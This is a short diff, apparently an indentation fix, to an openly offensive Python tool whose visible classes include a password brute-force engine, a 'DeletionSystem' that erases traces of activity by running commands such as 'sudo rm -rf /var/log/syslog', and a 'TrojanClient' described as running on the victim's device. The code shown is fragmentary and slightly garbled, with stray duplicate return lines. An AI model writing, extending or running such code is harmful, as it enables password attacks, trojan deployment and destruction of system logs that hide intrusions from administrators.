@@ -91,13 +91,12 @@ class BruteForceEngine:
              print(f"[BRUTE] Password found: {word}")
              return word
              return None
-
 class DeletionSystem:
- """Erases traces of activity using Linux tools."""
- def __init__(self):
-     self.deleted_files = []
-        
-def scrub_logs(self):
+    """Erases traces of activity using Linux tools."""
+    def __init__(self):
+        self.deleted_files = []
+
+    def scrub_logs(self):
         """Uses shell commands to delete logs."""
         commands = [
             "sudo rm -rf /var/log/syslog",
@@ -123,6 +122,7 @@ def scrub_logs(self):
                 self.deleted_files.append(path)
             except Exception:
                 pass
+         
    
 class TrojanClient:
  """The agent that runs on the victim's device."""
